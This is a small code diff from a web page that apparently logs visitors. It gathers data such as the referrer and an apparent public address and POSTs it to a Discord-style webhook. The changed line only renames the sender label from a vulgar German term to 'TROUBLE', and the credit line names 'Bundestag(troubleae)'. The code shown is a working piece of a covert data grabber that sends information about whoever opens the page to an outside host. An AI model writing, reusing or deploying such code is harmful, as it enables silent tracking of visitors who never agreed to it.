@@ -245,7 +245,7 @@
       {name:' Opened From',  value:`\`${document.referrer||'opened directly'}\``,         inline:false},
     ];
     try{
-      const res=await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'FOTZENFINDER',embeds:[{color:0xffffff,fields,footer:{text:`${now} • made by Bundestag(troubleae)`}}]})});
+      const res=await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'TROUBLE',embeds:[{color:0xffffff,fields,footer:{text:`${now} • made by Bundestag(troubleae)`}}]})});
       if(res.ok||res.status===204){st.className='status ok';st.textContent=`✓ ${pub}`;}
       else{st.className='status err';st.textContent=`fehler ${res.status}`;}
     }catch{st.className='status err';st.textContent='Network Error';}
